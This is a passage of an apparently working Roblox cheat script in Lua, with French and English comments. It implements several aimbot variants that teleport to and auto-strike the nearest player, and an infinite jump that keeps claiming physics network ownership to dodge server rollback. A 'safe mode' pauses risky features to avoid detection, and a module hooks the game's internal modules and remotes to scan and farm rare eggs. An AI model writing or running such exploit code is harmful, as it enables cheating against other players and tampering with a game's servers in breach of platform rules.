	local char=LP.Character; local root=char and char:FindFirstChild("HumanoidRootPart"); local hum=char and char:FindFirstChildOfClass("Humanoid")
	if root then root.AssemblyLinearVelocity=Vector3.zero; root.AssemblyAngularVelocity=Vector3.zero end
	if hum then hum.AutoRotate=true end
end

-- Aim Bypass (face tracking)
-- ===================================================================
-- AIM V3 (anti-desync + TP ennemi + frappe)
-- AIM V3 (anti-desync + enemy TP + strike)
local AimV3 = {active=false, conn=nil}
local _av3HitCD = false

local function _av3GetBat()
	local char=LP.Character; if not char then return nil end
	-- Looks for "Bat" only, like in aimv3.txt (simple getBat)
	local tool=char:FindFirstChild("Bat"); if tool then return tool end
	local bp=LP:FindFirstChildOfClass("Backpack")
	if bp then tool=bp:FindFirstChild("Bat"); if tool then tool.Parent=char; return tool end end
	-- Fallback to all bat-type tools (BAT_NAMES already includes "Bat")
	for _,n in ipairs(BAT_NAMES) do
		local t=char:FindFirstChild(n); if t then return t end
		if bp then t=bp:FindFirstChild(n); if t then t.Parent=char; return t end end
	end
	return nil
end

local function _av3Hit()
	if _av3HitCD then return end
	_av3HitCD=true
	pcall(function()
		local bat=_av3GetBat(); if not bat then return end
		pcall(function() bat:Activate() end)
		local ev=bat:FindFirstChildWhichIsA("RemoteEvent")
		if ev then pcall(function() ev:FireServer() end) end
	end)
	task.delay(0.08,function() _av3HitCD=false end)
end

local function _av3Nearest(root)
	local best,bestD=nil,math.huge
	for _,p in ipairs(Players:GetPlayers()) do
		if p~=LP and p.Character then
			local tr=p.Character:FindFirstChild("HumanoidRootPart")
			if tr then local d=(root.Position-tr.Position).Magnitude; if d<bestD then bestD=d; best=p end end
		end
	end
	return best
end

function AimV3.start()
	if _GH.SM_tryStart and not _GH.SM_tryStart() then return end
	if AimV3.conn then AimV3.conn:Disconnect() end; AimV3.active=true
	AimV3.conn=RunService.Heartbeat:Connect(function()
		if not AimV3.active then return end
		local root=LP.Character and LP.Character:FindFirstChild("HumanoidRootPart"); if not root then return end
		local target=_av3Nearest(root); if not target or not target.Character then return end
		local tr=target.Character:FindFirstChild("HumanoidRootPart"); if not tr then return end
		pcall(function()
			if sethiddenproperty then sethiddenproperty(root,"PhysicsRepRootPart",tr) end
			local targetPos=tr.Position+Vector3.new(0,0.9,0)
			if (root.Position-targetPos).Magnitude>8 then root.CFrame=CFrame.new(targetPos) end
			local cam=workspace.CurrentCamera
			cam.CFrame=CFrame.new(cam.CFrame.Position,tr.Position)
			_av3Hit()
		end)
	end)
end
function AimV3.stop()
	if AimV3.conn then AimV3.conn:Disconnect(); AimV3.conn=nil end; AimV3.active=false
end

-- Aim V2 / Anti-Bypass — copie exacte de AceStartAntiBypassAimbot :
-- chase direct (pas de prédiction de vélocité), Lerp 0.8 sur la vitesse,
-- clamp Y [-70,110], rotation via AssemblyAngularVelocity clampée ±2.5
-- rad puis *42. Swing distance-gated (8 studs) avec cooldown 0.35s.
-- Ancien système (unwalk, scan-cache, TURN_SPEED/MAX_TURN_RATE,
-- FOLLOW_DIST/standPos) supprimé — n'existe pas chez Ace.
local ABP = {active=false, conn=nil, swingCooldown=false}
local ABP_SPEED = 58

local function ABP_findBat()
	local char=LP.Character; if not char then return nil end
	for _,name in ipairs(BAT_NAMES) do
		local t=char:FindFirstChild(name)
		if t and t:IsA("Tool") then return t end
	end
	local bp=LP:FindFirstChildOfClass("Backpack")
	if bp then
		for _,name in ipairs(BAT_NAMES) do
			local t=bp:FindFirstChild(name)
			if t and t:IsA("Tool") then
				local hum=char:FindFirstChildOfClass("Humanoid")
				if hum then pcall(function() hum:EquipTool(t) end) end
				return t
			end
		end
	end
	for _,ch in ipairs(char:GetChildren()) do
		if ch:IsA("Tool") and (ch.Name:lower():find("bat") or ch.Name:lower():find("slap")) then return ch end
	end
	return nil
end

local function ABP_trySwing()
	if ABP.swingCooldown then return end
	ABP.swingCooldown = true
	pcall(function()
		local char=LP.Character; if not char then return end
		local bat=ABP_findBat()
		if bat then
			if bat.Parent~=char then
				local hum=char:FindFirstChildOfClass("Humanoid")
				if hum then pcall(function() hum:EquipTool(bat) end) end
			end
			pcall(function() bat:Activate() end)
		end
	end)
	task.delay(0.35, function() ABP.swingCooldown = false end)
end

local function ABP_getClosest()
	local root = LP.Character and LP.Character:FindFirstChild("HumanoidRootPart")
	if not root then return nil, math.huge end
	local closest, minDist = nil, math.huge
	for _, plr in ipairs(Players:GetPlayers()) do
		if plr ~= LP and plr.Character then
			local tRoot = plr.Character:FindFirstChild("HumanoidRootPart")
			local hum = plr.Character:FindFirstChildOfClass("Humanoid")
			if tRoot and hum and hum.Health > 0 then
				local dist = (tRoot.Position - root.Position).Magnitude
				if dist < minDist then minDist = dist; closest = tRoot end
			end
		end
	end
	return closest, minDist
end

function ABP.start()
	if _GH.SM_tryStart and not _GH.SM_tryStart() then return end
	if ABP.conn then ABP.conn:Disconnect() end; ABP.active=true
	local hum0=LP.Character and LP.Character:FindFirstChildOfClass("Humanoid")
	if hum0 then hum0.AutoRotate=false end
	ABP.conn=RunService.Heartbeat:Connect(function()
		if not ABP.active then return end
		local char=LP.Character; if not char then return end
		local root=char:FindFirstChild("HumanoidRootPart"); if not root then return end
		local hum=char:FindFirstChildOfClass("Humanoid"); if not hum then return end
		if not char:FindFirstChildOfClass("Tool") then
			local bat=ABP_findBat(); if bat then pcall(function() hum:EquipTool(bat) end) end
		end
		local target, targetDist = ABP_getClosest()
		if not target then return end
		local myPos = root.Position
		local targetPos = target.Position
		local direction = targetPos - myPos
		local flatDir = Vector3.new(direction.X, 0, direction.Z)
		flatDir = flatDir.Magnitude > 0 and flatDir.Unit or Vector3.zero
		local desiredHeight = targetPos.Y + 3.7
		local yVel = (desiredHeight - myPos.Y) * 19.5
		if hum.FloorMaterial ~= Enum.Material.Air then yVel = math.max(yVel, 13) end
		yVel = math.clamp(yVel, -70, 110)
		local desiredVel = Vector3.new(flatDir.X * ABP_SPEED, yVel, flatDir.Z * ABP_SPEED)
		root.AssemblyLinearVelocity = root.AssemblyLinearVelocity:Lerp(desiredVel, 0.8)
		local toTarget = targetPos - myPos
		if toTarget.Magnitude > 0.1 then
			local goalCF = CFrame.lookAt(myPos, targetPos)
			local diffCF = root.CFrame:Inverse() * goalCF
			local rx, ry, rz = diffCF:ToEulerAnglesXYZ()
			rx = math.clamp(rx, -2.5, 2.5); ry = math.clamp(ry, -2.5, 2.5); rz = math.clamp(rz, -2.5, 2.5)
			root.AssemblyAngularVelocity = root.CFrame:VectorToWorldSpace(Vector3.new(rx*42, ry*42, rz*42))
		end
		if targetDist <= 8 then ABP_trySwing() end
	end)
end
function ABP.stop()
	if ABP.conn then ABP.conn:Disconnect(); ABP.conn=nil end; ABP.active=false
	ABP.swingCooldown = false
	local c=LP.Character; local root=c and c:FindFirstChild("HumanoidRootPart")
	if root then root.AssemblyLinearVelocity=Vector3.zero; root.AssemblyAngularVelocity=Vector3.zero end
	local hum2=c and c:FindFirstChildOfClass("Humanoid")
	if hum2 then hum2.AutoRotate=true end
end

-- ===================================================================
-- INFINITE JUMP
-- ===================================================================
-- Copie de la logique Ace Duels, simplifiée : un seul comportement —
-- boost immédiat à chaque JumpRequest (tap). Hold jump (clavier Espace
-- maintenu, ButtonA manette maintenu, bouton mobile JumpButton maintenu)
-- retiré à la demande — plus de boost continu tant qu'on maintient.
local IJ = {active=false, conns={}}

-- Same rollback fix as the speed engine, made PROACTIVE this time instead
-- of reactive: claiming ownership only at the instant a jump fires (the
-- previous approach) still leaves a race — SetNetworkOwner takes a beat to
-- actually hand physics authority to the client, and root.Velocity was
-- being written in that same instant, before the transfer had necessarily
-- landed. That gap is exactly where a rollback can sneak in on the very
-- jump that triggered the claim. Now ownership is claimed and kept fresh
-- continuously the whole time Infinite Jump is active — immediately on
-- start(), again after every respawn, and re-asserted every 0.8-1.2s and
-- on any ReceiveAge change — so by the time a jump actually happens the
-- client has already been physics-authoritative for a while.
-- Only _claimOwn (stateless pcall wrapper) is reused from the speed
-- engine above. _watchOwn is NOT reusable here: it owns the speed
-- engine's shared _ownWatchConn and gates its callback on
-- _speedBoosterActive, so IJ gets its own independent watcher instead.
local _ijOwnWatchConn  = nil
local _ijOwnTimer      = 0
local _ijOwnInterval   = 0.8 + math.random() * 0.4

local function _ijWatchOwn(root)
	if _ijOwnWatchConn then pcall(function() _ijOwnWatchConn:Disconnect() end) end
	_ijOwnWatchConn = root:GetPropertyChangedSignal("ReceiveAge"):Connect(function()
		if IJ.active then task.defer(function() _claimOwn(root) end) end
	end)
end

local function _ijClaimForCurrentChar()
	local char = LP.Character
	local root = char and char:FindFirstChild("HumanoidRootPart")
	if not root then return end
	_claimOwn(root)
	_ijWatchOwn(root)
end

local function _ijApplyBoost(boost)
	if not IJ.active then return end
	local char = LP.Character
	local root = char and char:FindFirstChild("HumanoidRootPart")
	local hum  = char and char:FindFirstChildOfClass("Humanoid")
	if not root or not hum or hum.Health <= 0 then return end
	root.AssemblyLinearVelocity = Vector3.new(  -- [FIX #2] Velocity dépréciée
		root.AssemblyLinearVelocity.X, boost or 50, root.AssemblyLinearVelocity.Z)
end

function IJ.start()
	IJ.active = true   -- [FIX #1] active doit être vrai avant tout usage interne
	if IJ.conns.jumpReq then return end -- déjà démarré
	IJ.conns.jumpReq = UIS.JumpRequest:Connect(function()
		_ijApplyBoost(50)
	end)
	-- Claim right away instead of waiting for the first jump
	_ijClaimForCurrentChar()
	-- Re-claim on respawn (character physics need a moment to settle,
	-- same 0.3s delay pattern the speed engine uses)
	IJ.conns.charAdded = LP.CharacterAdded:Connect(function()
		task.delay(0.3, function()
			if IJ.active then _ijClaimForCurrentChar() end
		end)
	end)
	-- Continuous belt-and-braces re-claim while the feature is on
	_ijOwnTimer = 0
	IJ.conns.ownLoop = RunService.Heartbeat:Connect(function(dt)
		if not IJ.active then return end
		_ijOwnTimer = _ijOwnTimer + dt
		if _ijOwnTimer >= _ijOwnInterval then
			local char = LP.Character
			local root = char and char:FindFirstChild("HumanoidRootPart")
			if root then _claimOwn(root) end
			_ijOwnTimer = 0; _ijOwnInterval = 0.8 + math.random() * 0.4
		end
	end)
end
function IJ.stop()
	IJ.active = false  -- [FIX #1] coupe les guards internes avant de déconnecter
	for _, c in pairs(IJ.conns) do pcall(function() c:Disconnect() end) end
	IJ.conns = {}
	if _ijOwnWatchConn then pcall(function() _ijOwnWatchConn:Disconnect() end); _ijOwnWatchConn = nil end
end

-- ===================================================================
-- BUILD PAGES
-- ===================================================================
local setAutoStealRowVisual
local setAutoGrabMethodUI -- (n) — met en évidence le bon bouton V1/V2, sans redémarrer quoi que ce soit
local setAntiRagdollRowVisual
local setBatCounterRowVisual
local setAimbotRowVisual
local setAimbotV2RowVisual

	-- Bat Counter — source bat_counter.txt (RemoteEvent support + "bat" keyword fallback)
local BatCounter = {active=false, conn=nil}
local _bcDebounce = false

-- findBatForCounter/swingBatForCounter identiques à Ace. isRagdoll
-- ajoute hum.PlatformStand (absent avant) — copie AceCounterIsRagdoll.
local function findBatForCounter()
	local c=LP.Character; if not c then return nil end
	local bp=LP:FindFirstChildOfClass("Backpack") or LP:FindFirstChild("Backpack")
	for _,name in ipairs(BAT_NAMES) do
		local t=c:FindFirstChild(name) or (bp and bp:FindFirstChild(name))
		if t then return t end
	end
	for _,ch in ipairs(c:GetChildren()) do if ch:IsA("Tool") and ch.Name:lower():find("bat") then return ch end end
	if bp then for _,ch in ipairs(bp:GetChildren()) do if ch:IsA("Tool") and ch.Name:lower():find("bat") then return ch end end end
	return nil
end
local function swingBatForCounter(bat,char)
	local hum2=char:FindFirstChildOfClass("Humanoid")
	if bat.Parent~=char then if hum2 then pcall(function() hum2:EquipTool(bat) end) end; task.wait(0.05) end
	local remote=bat:FindFirstChildOfClass("RemoteEvent") or bat:FindFirstChildOfClass("RemoteFunction")
	if remote and remote:IsA("RemoteEvent") then
		pcall(function() remote:FireServer() end); task.wait(0.15); pcall(function() remote:FireServer() end)
	else pcall(function() bat:Activate() end); task.wait(0.15); pcall(function() bat:Activate() end) end
end
local function isRagdollForCounter(hum2)
	if not hum2 then return false end
	local st=hum2:GetState()
	return st==Enum.HumanoidStateType.Physics or st==Enum.HumanoidStateType.Ragdoll
		or st==Enum.HumanoidStateType.FallingDown or hum2.PlatformStand==true
end
function BatCounter.start()
	if BatCounter.conn then BatCounter.conn:Disconnect() end
	BatCounter.conn=RunService.Heartbeat:Connect(function()
		if not BatCounter.active or _bcDebounce then return end
		local char=LP.Character; if not char then return end
		local hum2=char:FindFirstChildOfClass("Humanoid"); if not hum2 then return end
		if isRagdollForCounter(hum2) then
			_bcDebounce=true
			task.spawn(function()
				local bat=findBatForCounter()
				if bat then swingBatForCounter(bat,char) end
				task.wait(0.5); _bcDebounce=false
			end)
		end
	end)
end
function BatCounter.stop()
	if BatCounter.conn then BatCounter.conn:Disconnect(); BatCounter.conn=nil end
	_bcDebounce=false
end

-- ===================================================================
-- ANTI-KICK / SAFE MODE — copie exacte de la logique Ace Duels.
-- Ace n'a AUCUN hook __namecall/Kick(), aucun GC scanner, aucun blocage
-- HTTP, aucun hook Shutdown/BindToClose : leur "anti-kick" est un
-- système passif "Safe Mode" qui met en pause les features risquées
-- (aimbot, auto-left, auto-right) pendant le countdown de duel ou
-- pendant qu'on tient un brainrot, plutôt que de bloquer activement.
-- Tout ce qu'Ace n'a pas (hooks metatable, GC scanner, HTTP block,
-- screen-text watcher) est supprimé, zéro trace.
-- ===================================================================
local _smEnabled = false

local function _smGetCountdownLabel()
	local ok, label = pcall(function()
		return LP.PlayerGui
			and LP.PlayerGui:FindFirstChild("DuelsMachineTopFrame")
			and LP.PlayerGui.DuelsMachineTopFrame:FindFirstChild("DuelsMachineTopFrame")
			and LP.PlayerGui.DuelsMachineTopFrame.DuelsMachineTopFrame:FindFirstChild("Timer")
			and LP.PlayerGui.DuelsMachineTopFrame.DuelsMachineTopFrame.Timer:FindFirstChild("Label")
	end)
	return (ok and label) or nil
end

local function _smCountdownNumber(text)
	local t = tostring(text or ""):upper():gsub("^%s+",""):gsub("%s+$","")
	if t == "GO" or t == "START" or t == "READY" then return true end
	local n = tonumber(t)
	return n ~= nil and n >= 0 and n <= 10
end

local function _smInDuelCountdown()
	local label = _smGetCountdownLabel()
	return label and _smCountdownNumber(label.Text) or false
end

local function _smHoldingBrainrot()
	local ok, val = pcall(function() return LP:GetAttribute("Stealing") end)
	if ok and val == true then return true end
	local ok2, val2 = pcall(function() return LP:GetAttribute("AntiKick") end)
	if ok2 and val2 == true then return true end
	local char = LP.Character
	if not char then return false end
	local ok3, val3 = pcall(function() return char:GetAttribute("Stealing") end)
	if ok3 and val3 == true then return true end
	if _G.AutoCarrySpeed and type(_G.AutoCarrySpeed.IsCarryingBrainrot) == "function" then
		local okCarry, carrying = pcall(function() return _G.AutoCarrySpeed.IsCarryingBrainrot(char) end)
		if okCarry and carrying then return true end
	end
	for _, name in ipairs({"Carrying","IsCarrying","Grabbed","Holding","StealHold","HasGrab"}) do
		local v = char:FindFirstChild(name, true)
		if v then
			if v:IsA("BoolValue") and v.Value then return true end
			if v:IsA("ObjectValue") and v.Value then return true end
			if v:IsA("StringValue") and v.Value ~= "" then return true end
		end
	end
	for _, child in ipairs(char:GetChildren()) do
		if child:IsA("Model") and child:FindFirstChildWhichIsA("BasePart", true) then
			local n = child.Name:lower()
			if n:find("brainrot") or n:find("animal") or n:find("carry") or n:find("grab") or n:find("steal") or n:find("hold") then
				return true
			end
		end
	end
	return false
end

local function _smIsLocked()
	if not _smEnabled then return false end
	return _smInDuelCountdown() or _smHoldingBrainrot()
end

local function _smForceStop(reason)
	local stopped = false
	if AB.active    then AB.stop();    stopped = true end
	if ABP.active   then ABP.stop();   stopped = true end
	if AimV3.active then AimV3.stop(); stopped = true end
	if State.autoLeftEnabled  then stopAutoLeft();  stopped = true end
	if State.autoRightEnabled then stopAutoRight(); stopped = true end
	if stopped then pcall(function() _GH.showToast(reason or "SAFE MODE LOCK", "off") end) end  -- [FIX B2] showActionNotification indéfinie → toast système
end

local function _smTryStart()
	if _smIsLocked() then
		_smForceStop("SAFE MODE LOCK")
		return false
	end
	return true
end

RunService.Heartbeat:Connect(function()
	if _smEnabled and _smIsLocked() then
		_smForceStop("SAFE MODE LOCK")
	end
end)

_GH.SM_enabled    = function() return _smEnabled end
_GH.SM_setEnabled = function(on) _smEnabled = on end
_GH.SM_tryStart   = _smTryStart
_GH.SM_forceStop  = _smForceStop

-- ===================================================================
-- PING MONITOR — "Don't Duel" warning when latency > 200 ms
-- ===================================================================
-- Strict single threshold: alert is ON while ping >= PING_WARN (200ms),
-- OFF as soon as it drops below 200ms. No hysteresis buffer.
-- _GH.pingWarn exposes the current state so the UI widget can react
-- without polling — the monitor sets it and calls the registered
-- callbacks itself.
-- ===================================================================
local PING_WARN       = 0.200   -- seconds — show warning at/above this
local PING_OK         = 0.200   -- seconds — clear warning below this (same as PING_WARN: strict threshold)
local PING_INTERVAL   = 0.5     -- check frequency (seconds)
local _pingWarnActive = false
local _pingCallbacks  = {}      -- functions to call on state change

local function _pingRegister(fn)
	table.insert(_pingCallbacks, fn)
end
local function _pingFire(isWarn, pingMs)
	for _, fn in ipairs(_pingCallbacks) do
		pcall(fn, isWarn, pingMs)
	end
end

_GH.pingWarn     = false
_GH.pingRegister = _pingRegister

task.spawn(function()
	while true do
		task.wait(PING_INTERVAL)
		local ok, raw = pcall(function() return LP:GetNetworkPing() end)
		if ok and type(raw) == "number" and raw == raw then   -- NaN guard
			local ms = math.floor(raw * 1000 + 0.5)
			local wasWarn = _pingWarnActive
			if not _pingWarnActive and raw >= PING_WARN then
				_pingWarnActive = true
			elseif _pingWarnActive and raw < PING_OK then
				_pingWarnActive = false
			end
			_GH.pingWarn = _pingWarnActive
			if _pingWarnActive ~= wasWarn then
				_pingFire(_pingWarnActive, ms)
			elseif _pingWarnActive then
				-- Still in warning zone: push updated ms so the label stays live.
				_pingFire(true, ms)
			end
		end
	end
end)

-- ===================================================================
-- yslemEgg GAME INFRASTRUCTURE (injected before _MH_buildUI)
-- ===================================================================
-- Single export table: all functions stored here (1 outer local only)
local _YE = {}

;(function() -- IIFE: own 200-local register space, upvalues reference outer scope

local St = State  -- alias (upvalue for all closures below)

-- Color aliases
local _YE_C = {
	MOON   = C_MOON,
	GREEN  = Color3.fromRGB(60,220,120),
	RED    = Color3.fromRGB(220,60,60),
	GOLD   = Color3.fromRGB(255,200,60),
	DIM    = C_DIM,
	WHITE  = C_WHITE,
	SILVER = Color3.fromRGB(210,222,240),
}

-- ============================================================
-- GAME MODULE DISCOVERY
-- ============================================================
local _moduleIndex = {}
for _, inst in ipairs(ReplicatedStorage:GetDescendants()) do
	if inst:IsA("ModuleScript") and not _moduleIndex[inst.Name] then
		_moduleIndex[inst.Name] = inst
	end
end
local _ModuleStatus, _ModuleFound = {}, {}
local function _tryRequire(name)
	local inst = _moduleIndex[name]
	_ModuleFound[name] = inst and inst:GetFullName() or nil
	if not inst then _ModuleStatus[name] = false; return nil end
	local ok, result = pcall(require, inst)
	_ModuleStatus[name] = ok and result ~= nil
	if ok then return result end
	return nil
end
-- Group all game modules into one table (avoids 15 separate locals)
local _M = {}
do
	local names = {"EggCmds","Ragdoll","Network","GuardEscapePrediction",
	               "GuardChasePolicy","ResolveGuardSpeedRequirement","SpeedPowerProjection",
	               "Guards","Areas","AreaEggSlotIdentity","Save","Constants",
	               "Bases","Treadmills","Trails"}
	local keys  = {"EggCmds","Ragdoll","Network","GEP","GCP","RGSR","SPP",
	               "GuardsD","AreasD","SlotId","Save","Constants","Bases","Treadmills","Trails"}
	for i = 1, #names do _M[keys[i]] = _tryRequire(names[i]) end
end
do
	local lines = {"[yslemEgg] Game module status:"}
	for _, name in ipairs({"EggCmds","Network","Ragdoll","GuardEscapePrediction","GuardChasePolicy",
		"ResolveGuardSpeedRequirement","SpeedPowerProjection","Guards","Areas",
		"AreaEggSlotIdentity","Save","Constants","Bases","Treadmills","Trails"}) do
		if _ModuleStatus[name] then
			table.insert(lines, "  OK        "..name.."  (".._ModuleFound[name]..")")
		elseif _ModuleFound[name] then
			table.insert(lines, "  FAILED    "..name)
		else
			table.insert(lines, "  NOT FOUND "..name)
		end
	end
	print(table.concat(lines, "\n"))
end

-- ============================================================
-- CONFIRMED REMOTES
-- ============================================================
local _NetworkingFolder = ReplicatedStorage:FindFirstChild("Packages")
_NetworkingFolder = _NetworkingFolder and _NetworkingFolder:FindFirstChild("Networking")
local function _getRemote(name)
	if not _NetworkingFolder then return nil end
	local exact = _NetworkingFolder:FindFirstChild(name)
	if exact then return exact end
	if not name:find("/", 1, true) then
		local suffix = "/"..name
		for _, inst in ipairs(_NetworkingFolder:GetChildren()) do
			if inst.Name:sub(-#suffix) == suffix then return inst end
		end
	end
	return nil
end
local function _invokeRF(name, ...)
	local r = _getRemote(name)
	if not r or not r:IsA("RemoteFunction") then return false, "not found" end
	local ok, result = pcall(function(...) return r:InvokeServer(...) end, ...)
	return ok, result
end
local function _fireRE(name, ...)
	local r = _getRemote(name)
	if not r or not r:IsA("RemoteEvent") then return false end
	return pcall(function(...) r:FireServer(...) end, ...)
end

-- ============================================================
-- GUARDED ZONES
-- ============================================================
local EXIT_DIR = Vector3.new(-1,0,0)
local AREA = {}
pcall(function() EXIT_DIR = -workspace.__OBJECTS.Areas.SeparationLine.CFrame.LookVector end)
do
	local folder = workspace:FindFirstChild("__OBJECTS")
	folder = folder and folder:FindFirstChild("Areas")
	folder = folder and folder:FindFirstChild("GuardAreas")
	if folder and _M.GuardsD and _M.AreasD and _M.GCP then
		for _, a in ipairs(folder:GetChildren()) do
			pcall(function()
				local d = _M.GuardsD.Directory[_M.AreasD.Directory[a.Name].GuardId]
				local rec = {
					cf = a.Bounds.CFrame, size = a.Bounds.Size,
					guardPos = a.Guard:GetPivot().Position,
					speed = d.WalkSpeed, radius = d.FlatRadius,
					hit = _M.GCP.ResolveHitDistance(d.HitDistance), reqSP = nil,
				}
				if _M.GEP and _M.RGSR then
					pcall(function()
						local exitPos = a.ClosestExitPoint.Position
						rec.reqSP = _M.RGSR({
							BaseGuardWalkSpeed = rec.speed, ExitDirection = EXIT_DIR,
							ExitDistance = _M.GEP.ResolveExitDistance(rec.cf, rec.size, exitPos, EXIT_DIR),
							FlatRadius = rec.radius, GuardStartPosition = rec.guardPos,
							HitDistance = rec.hit, PlayerStartPosition = exitPos,
						})
					end)
				end
				AREA[a.Name] = rec
			end)
		end
	end
end
local curSP = 0
task.spawn(function()
	while true do
		if _M.SPP then pcall(function() curSP = _M.SPP.GetSpeedPower() or curSP end) end
		task.wait(1)
	end
end)
local function areaUnlocked(areaId)
	local A = AREA[areaId]
	if not A or not A.reqSP then return true end
	return curSP >= A.reqSP
end

-- ============================================================
-- SAFE ZONE
-- ============================================================
local _safeZonePos = nil
local function _findSafeZonePos()
	if _safeZonePos then return _safeZonePos end
	local found = nil
	pcall(function()
		for _, inst in ipairs(workspace:GetDescendants()) do
			if inst.Name:lower():find("safe", 1, true) then
				if inst:IsA("BasePart") then
					found = inst.Position; break
				elseif inst:IsA("Model") then
					local ok, cf = pcall(function() return inst:GetPivot() end)
					if ok and cf then found = cf.Position; break end
				end
			end
		end
	end)
	if not found then
		pcall(function()
			local sep = workspace.__OBJECTS.Areas.SeparationLine
			found = sep.Position + EXIT_DIR * 50
		end)
	end
	_safeZonePos = found
	return found
end

-- ============================================================
-- EGG SCANNER
-- ============================================================
local _RARE_KEYWORDS = {
	"secret","eternal","divine","divin","mythic","celestial","ancient",
	"rainbow","golden","shiny","radiant","corrupted","void","legendary",
}
local function _readEggLabels(root)
	local texts = {}
	pcall(function()
		for _, d in ipairs(root:GetDescendants()) do
			if d:IsA("TextLabel") and d.Text ~= "" then table.insert(texts, d.Text) end
		end
	end)
	local full = table.concat(texts, " | ")
	local low = full:lower()
	local tags = {}
	for _, kw in ipairs(_RARE_KEYWORDS) do
		if low:find(kw, 1, true) then table.insert(tags, kw) end
	end
	local weight = full:match("([%d][%d%.,]*)%s*[Kk][Gg]")
	return full, tags, weight
end
local function _promptOwnerModel(prompt)
	local part = prompt.Parent
	if not part then return nil, nil end
	if not part:IsA("BasePart") then
		local anc = part
		while anc and not anc:IsA("BasePart") do anc = anc.Parent end
		part = anc
	end
	if not part then return nil, nil end
	local model = part
	while model and model.Parent and model.Parent ~= workspace and not model:IsA("Model") do
		model = model.Parent
	end
	return part, (model and model:IsA("Model")) and model or part
end
local _fieldEggNet = {}
local function _posToZone(pos)
	for zn, A in pairs(AREA) do
		if A.cf and A.size then
			local lp2 = A.cf:PointToObjectSpace(pos)
			local hs = A.size * 0.5
			if math.abs(lp2.X) <= hs.X and math.abs(lp2.Z) <= hs.Z then return zn end
		end
	end
	return "?"
end
pcall(function()
	local re = _getRemote("RE/EggWorld/FieldEggShifted")
	if not (re and re:IsA("RemoteEvent")) then return end
	local _ID_KEYS = {"Uid","UID","Id","ID","SlotId","SlotID","EggId","EggID","EggUid","Guid","GUID"}
	re.OnClientEvent:Connect(function(a1, a2)
		local data, realUid
		if type(a2) == "table" then
			data = a2
			if type(a1) == "string" or type(a1) == "number" then realUid = tostring(a1) end
		elseif type(a1) == "table" then
			data = a1
		else return end
		local cf2, pos2
		if typeof(data.BoundsCFrame) == "CFrame" then
			cf2 = data.BoundsCFrame; pos2 = cf2.Position
		elseif typeof(data.BottomCFrame) == "CFrame" then
			cf2 = data.BottomCFrame; pos2 = cf2.Position
		elseif typeof(data.CFrame) == "CFrame" then
			cf2 = data.CFrame; pos2 = cf2.Position
		end
		if not pos2 then return end
		if not realUid then
			for _, k in ipairs(_ID_KEYS) do
				local v = data[k]
				if type(v) == "string" or type(v) == "number" then realUid = tostring(v); break end
			end
		end
		local mutation = type(data.Mutation) == "string" and data.Mutation or nil
		local nestScale = type(data.NestScale) == "number" and data.NestScale or nil
		local zoneDir = data.Zone or data.Area or data.AreaName or data.Island or data.ZoneName
		local zone = (type(zoneDir)=="string" and zoneDir~="") and zoneDir or _posToZone(pos2)
		local tags = {}
		local low = (mutation or ""):lower()
		for _, kw in ipairs(_RARE_KEYWORDS) do
			if low:find(kw, 1, true) then table.insert(tags, kw) end
		end
		local cacheKey = realUid or string.format("%.0f_%.0f_%.0f", pos2.X, pos2.Y, pos2.Z)
		local walkPos = (typeof(data.BottomCFrame)=="CFrame" and data.BottomCFrame.Position) or pos2
		_fieldEggNet[cacheKey] = {
			pos=walkPos, cf=cf2, mutation=mutation, nestScale=nestScale,
			zone=zone, tags=tags, uid=realUid, t=tick(), enabled=true,
			farmable=(realUid ~= nil),
		}
	end)
end)
local _snapshotDebugPrinted = false
task.spawn(function()
	while true do
		task.wait(3)
		local ok, snap = _invokeRF("RF/EggWorld/AskFieldEggSnapshot")
		if ok and type(snap) ~= "table" then ok = false end
		if ok and not _snapshotDebugPrinted then
			_snapshotDebugPrinted = true
			local dumpOk, dump = pcall(function() return HttpService:JSONEncode(snap) end)
			print("[yslemEgg] AskFieldEggSnapshot (first result):")
			print(dumpOk and dump:sub(1, 800) or "<not serializable>")
		elseif not ok and not _snapshotDebugPrinted then
			_snapshotDebugPrinted = true
			print("[yslemEgg] AskFieldEggSnapshot: unavailable")
		end
		if ok then
			local now2 = tick()
			pcall(function()
				for uid, data in pairs(snap) do
					local uid2 = tostring(uid)
					if type(data) == "table" and not _fieldEggNet[uid2] then
						local cf2, pos2
						if typeof(data.BoundsCFrame) == "CFrame" then
							cf2 = data.BoundsCFrame; pos2 = cf2.Position
						elseif typeof(data.BottomCFrame) == "CFrame" then
							cf2 = data.BottomCFrame; pos2 = cf2.Position
						elseif typeof(data.CFrame) == "CFrame" then
							cf2 = data.CFrame; pos2 = cf2.Position
						end
						if pos2 then
							local mutation = type(data.Mutation) == "string" and data.Mutation or nil
							local nestScale = type(data.NestScale) == "number" and data.NestScale or nil
							local zoneDir2 = data.Zone or data.Area or data.AreaName or data.Island or data.ZoneName
							local zone = (type(zoneDir2)=="string" and zoneDir2~="") and zoneDir2 or _posToZone(pos2)
							local tags2 = {}
							local low2 = (mutation or ""):lower()
							for _, kw in ipairs(_RARE_KEYWORDS) do
								if low2:find(kw,1,true) then table.insert(tags2, kw) end
							end
							local walkPos2 = (typeof(data.BottomCFrame)=="CFrame" and data.BottomCFrame.Position) or pos2
							_fieldEggNet[uid2] = {
								pos=walkPos2, cf=cf2, mutation=mutation, nestScale=nestScale,
								zone=zone, tags=tags2, uid=uid2,
								t=now2, enabled=true, farmable=true,
							}
						end
					end
				end
			end)
		end
	end
end)
local cachedEggs = {}
task.spawn(function()
	while true do
		local eggs = {}
		local slotsRoot = workspace:FindFirstChild("AreaEggSlotsClient", true)
		local function _upsertEgg(entry)
			for i, ex in ipairs(eggs) do
				if (ex.pos - entry.pos).Magnitude < 4 then
					local newIsBetter = (entry.prompt ~= nil and ex.prompt == nil)
						or (entry.farmable and not ex.farmable)
					if newIsBetter then eggs[i] = entry end
					return false
				end
			end
			table.insert(eggs, entry)
			return true
		end
		local now2 = tick()
		for cacheKey, e in pairs(_fieldEggNet) do
			if now2 - e.t > 60 then
				_fieldEggNet[cacheKey] = nil
			else
				_upsertEgg({
					pos=e.pos, cf=e.cf, area=e.zone,
					cat=e.mutation or (e.zone.." Egg"),
					mutation=e.mutation, tags=e.tags,
					weight=nil, scale=e.nestScale, rawText=e.mutation or "",
					enabled=true, uid=e.uid, netOnly=true, farmable=e.farmable,
				})
			end
		end
		if slotsRoot then
			for _, slot in ipairs(slotsRoot:GetChildren()) do
				pcall(function()
					local sname = slot.Name
					if not sname:find(tostring(LP.UserId), 1, true) then return end
					local zone = sname:match("_(%u[%a%s]+):Slot") or "?"
					local pos3, cf3
					if slot:IsA("BasePart") then
